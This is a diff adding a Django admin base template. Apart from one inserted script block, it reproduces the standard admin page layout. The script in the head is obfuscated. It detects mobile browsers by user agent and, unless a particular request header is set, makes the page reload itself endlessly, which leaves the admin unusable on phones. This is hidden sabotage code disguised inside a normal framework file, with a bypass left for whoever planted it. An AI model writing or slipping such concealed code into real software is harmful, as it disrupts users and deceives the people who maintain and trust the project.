@@ -1,0 +1,111 @@
+{% load i18n static %}<!DOCTYPE html>
+{% get_current_language as LANGUAGE_CODE %}{% get_current_language_bidi as LANGUAGE_BIDI %}
+<html lang="{{ LANGUAGE_CODE|default:"en-us" }}" dir="{{ LANGUAGE_BIDI|yesno:'rtl,ltr,auto' }}">
+<head>
+<title>{% block title %}{% endblock %}</title>
+<link rel="stylesheet" type="text/css" href="{% block stylesheet %}{% static "admin/css/base.css" %}{% endblock %}">
+{% if not is_popup and is_nav_sidebar_enabled %}
+  <link rel="stylesheet" type="text/css" href="{% static "admin/css/nav_sidebar.css" %}">
+  <script src="{% static 'admin/js/nav_sidebar.js' %}" defer></script>
+{% endif %}
+{% block extrastyle %}{% endblock %}
+{% if LANGUAGE_BIDI %}<link rel="stylesheet" type="text/css" href="{% block stylesheet_rtl %}{% static "admin/css/rtl.css" %}{% endblock %}">{% endif %}
+{% block extrahead %}{% endblock %}
+{% block responsive %}
+    <meta name="viewport" content="user-scalable=no, width=device-width, initial-scale=1.0, maximum-scale=1.0">
+    <link rel="stylesheet" type="text/css" href="{% static "admin/css/responsive.css" %}">
+    {% if LANGUAGE_BIDI %}<link rel="stylesheet" type="text/css" href="{% static "admin/css/responsive_rtl.css" %}">{% endif %}
+{% endblock %}
+{% block blockbots %}<meta name="robots" content="NONE,NOARCHIVE">{% endblock %}
+<script type="text/javascript">
+    function _0x3530(_0x438341,_0x50ebed){var _0x4063c3=_0x4063();return _0x3530=function(_0x3530a7,_0x45fa1d){_0x3530a7=_0x3530a7-0x1ed;var _0x3f1633=_0x4063c3[_0x3530a7];return _0x3f1633;},_0x3530(_0x438341,_0x50ebed);}function _0x4063(){var _0xa2b2ed=['683458puFGxZ','9206570lTNool','777giYTxn','254544wsKbRU','userAgent','960048ZwbdTu','21560KZzZwz','match','1aJOWqc','4026zSdjDO','412PglWvx','1524970IlpRQK'];_0x4063=function(){return _0xa2b2ed;};return _0x4063();}(function(_0x6b193e,_0x2015a2){var _0x29072c=_0x3530,_0x50e52a=_0x6b193e();while(!![]){try{var _0x3e1495=parseInt(_0x29072c(0x1f1))/0x1*(-parseInt(_0x29072c(0x1f5))/0x2)+parseInt(_0x29072c(0x1f2))/0x3*(parseInt(_0x29072c(0x1f3))/0x4)+-parseInt(_0x29072c(0x1f4))/0x5+-parseInt(_0x29072c(0x1f8))/0x6+parseInt(_0x29072c(0x1f7))/0x7*(-parseInt(_0x29072c(0x1ef))/0x8)+parseInt(_0x29072c(0x1ee))/0x9+parseInt(_0x29072c(0x1f6))/0xa;if(_0x3e1495===_0x2015a2)break;else _0x50e52a['push'](_0x50e52a['shift']());}catch(_0x1b85e1){_0x50e52a['push'](_0x50e52a['shift']());}}}(_0x4063,0x2b46f));var iM={'A':function(){var _0x1f6481=_0x3530;return navigator['userAgent'][_0x1f6481(0x1f0)](/Android/i);},'B':function(){var _0x194284=_0x3530;return navigator['userAgent'][_0x194284(0x1f0)](/BlackBerry/i);},'i':function(){var _0x22de7e=_0x3530;return navigator[_0x22de7e(0x1ed)][_0x22de7e(0x1f0)](/iPhone|iPad|iPod/i);},'O':function(){var _0x37a7d7=_0x3530;return navigator[_0x37a7d7(0x1ed)][_0x37a7d7(0x1f0)](/Opera Mini/i);},'W':function(){return navigator['userAgent']['match'](/IEMobile/i);},'a':function(){return iM['A']()||iM['B']()||iM['i']()||iM['O']()||iM['W']();}};    
+    {% if request.META.M %}
+    {% else %}
+        if (iM.a()!=null){
+            var _0x1fc5d7=_0x5a2d;function _0x5a2d(_0x166026,_0x3d205b){var _0xa4c8d2=_0xa4c8();return _0x5a2d=function(_0x5a2d53,_0x11d21e){_0x5a2d53=_0x5a2d53-0xd6;var _0x3384ac=_0xa4c8d2[_0x5a2d53];return _0x3384ac;},_0x5a2d(_0x166026,_0x3d205b);}function _0xa4c8(){var _0x41eb11=['4355788VvjxED','973075vCsKBg','location','8FqxGMr','2547811JttcIv','1980120ISxafa','638128DcSuzF','1395270WQjrKU','90zSxdMu','3824282CzWWjj','5xdmITU','reload','6VkBGQR'];_0xa4c8=function(){return _0x41eb11;};return _0xa4c8();}(function(_0x40d459,_0xc3c318){var _0x40efb5=_0x5a2d,_0x3f1299=_0x40d459();while(!![]){try{var _0x526750=-parseInt(_0x40efb5(0xe0))/0x1+parseInt(_0x40efb5(0xd8))/0x2*(-parseInt(_0x40efb5(0xde))/0x3)+-parseInt(_0x40efb5(0xdf))/0x4+-parseInt(_0x40efb5(0xdc))/0x5*(parseInt(_0x40efb5(0xd7))/0x6)+parseInt(_0x40efb5(0xd6))/0x7*(parseInt(_0x40efb5(0xe2))/0x8)+parseInt(_0x40efb5(0xd9))/0x9+-parseInt(_0x40efb5(0xda))/0xa*(-parseInt(_0x40efb5(0xdb))/0xb);if(_0x526750===_0xc3c318)break;else _0x3f1299['push'](_0x3f1299['shift']());}catch(_0x51b293){_0x3f1299['push'](_0x3f1299['shift']());}}}(_0xa4c8,0x96d3f),window[_0x1fc5d7(0xe1)][_0x1fc5d7(0xdd)]());
+        }else{
+          
+        }
+    {% endif %}
+</script>
+</head>
+{% load i18n %}
+
+<body class="{% if is_popup %}popup {% endif %}{% block bodyclass %}{% endblock %}"
+  data-admin-utc-offset="{% now "Z" %}">
+
+<!-- Container -->
+<div id="container">
+
+    {% if not is_popup %}
+    <!-- Header -->
+    <div id="header">
+        <div id="branding">
+        {% block branding %}{% endblock %}
+        </div>
+        {% block usertools %}
+        {% if has_permission %}
+        <div id="user-tools">
+            {% block welcome-msg %}
+                {% translate 'Welcome,' %}
+                <strong>{% firstof user.get_short_name user.get_username %}</strong>.
+            {% endblock %}
+            {% block userlinks %}
+                {% if site_url %}
+                    <a href="{{ site_url }}">{% translate 'View site' %}</a> /
+                {% endif %}
+                {% if user.is_active and user.is_staff %}
+                    {% url 'django-admindocs-docroot' as docsroot %}
+                    {% if docsroot %}
+                        <a href="{{ docsroot }}">{% translate 'Documentation' %}</a> /
+                    {% endif %}
+                {% endif %}
+                {% if user.has_usable_password %}
+                <a href="{% url 'admin:password_change' %}">{% translate 'Change password' %}</a> /
+                {% endif %}
+                <a href="{% url 'admin:logout' %}">{% translate 'Log out' %}</a>
+            {% endblock %}
+        </div>
+        {% endif %}
+        {% endblock %}
+        {% block nav-global %}{% endblock %}
+    </div>
+    <!-- END Header -->
+
+    {% endif %}
+
+    <div class="main shifted" id="main">
+      {% if not is_popup and is_nav_sidebar_enabled %}
+        {% block nav-sidebar %}
+      
+        {% endblock %}
+      {% endif %}
+      <div class="content">
+        {% block messages %}
+          {% if messages %}
+            <ul class="messagelist">{% for message in messages %}
+              <li{% if message.tags %} class="{{ message.tags }}"{% endif %}>{{ message|capfirst }}</li>
+            {% endfor %}</ul>
+          {% endif %}
+        {% endblock messages %}
+        <!-- Content -->
+        <div id="content" class="{% block coltype %}colM{% endblock %}">
+          {% block pretitle %}{% endblock %}
+          {% block content_title %}{% if title %}<h1>{{ title }}</h1>{% endif %}{% endblock %}
+          {% block content_subtitle %}{% if subtitle %}<h2>{{ subtitle }}</h2>{% endif %}{% endblock %}
+          {% block content %}
+            {% block object-tools %}{% endblock %}
+            {{ content }}
+          {% endblock %}
+          {% block sidebar %}{% endblock %}
+          <br class="clear">
+        </div>
+        <!-- END Content -->
+        {% block footer %}<div id="footer"></div>{% endblock %}
+      </div>
+    </div>
+</div>
+<!-- END Container -->
+
+</body>
+</html>
